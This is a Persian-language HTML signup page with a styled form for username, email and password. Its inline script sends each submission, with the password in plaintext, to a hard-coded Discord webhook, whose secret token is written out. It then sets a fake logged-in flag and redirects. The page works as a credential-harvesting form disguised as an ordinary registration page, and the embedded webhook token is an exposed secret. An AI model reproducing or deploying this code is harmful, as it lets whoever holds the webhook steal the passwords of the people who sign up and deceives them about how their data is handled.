<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ثبت نام</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0e0e0e;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background: #1a1a1a;
      padding: 2rem;
      border-radius: 12px;
      width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #8a2be2;
    }
    .form-group {
      margin-bottom: 1rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
    }
    input {
      width: 100%;
      padding: 0.7rem;
      border: none;
      border-radius: 8px;
      background: #2a2a2a;
      color: #fff;
    }
    .btn {
      width: 100%;
      padding: 0.8rem;
      background: #8a2be2;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn:hover {
      background: #6a1db7;
    }
    .link {
      display: block;
      text-align: center;
      margin-top: 1rem;
      color: #aaa;
      text-decoration: none;
    }
    .link:hover {
      color: #fff;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>ثبت نام</h2>
    <form id="registerForm">
      <div class="form-group">
        <label for="username">نام کاربری</label>
        <input type="text" id="username" required>
      </div>
      <div class="form-group">
        <label for="email">ایمیل</label>
        <input type="email" id="email" required>
      </div>
      <div class="form-group">
        <label for="password">رمز عبور</label>
        <input type="password" id="password" required>
      </div>
      <button type="submit" class="btn">ثبت نام</button>
    </form>
    <a href="login.html" class="link">حساب دارید؟ وارد شوید</a>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1412473238486913094/v89cAZO7YVTM-0Cs_tQbDvnZrYXfPd0xrplFJwEeC3TJI8J5eeKorVx7dCSq_6HraYLc";

    document.getElementById("registerForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const payload = {
        content: `📥 **ثبت‌نام جدید**\n👤 یوزرنیم: ${username}\n📧 ایمیل: ${email}\n🔑 پسورد: ${password}`
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        // ذخیره وضعیت لاگین
        localStorage.setItem("isLoggedIn", "true");

        // ریدایرکت به صفحه اصلی
        window.location.href = "index.html";
      } catch (err) {
        alert("❌ خطا در ثبت‌نام، دوباره تلاش کنید.");
      }
    });
  </script>
</body>
</html>
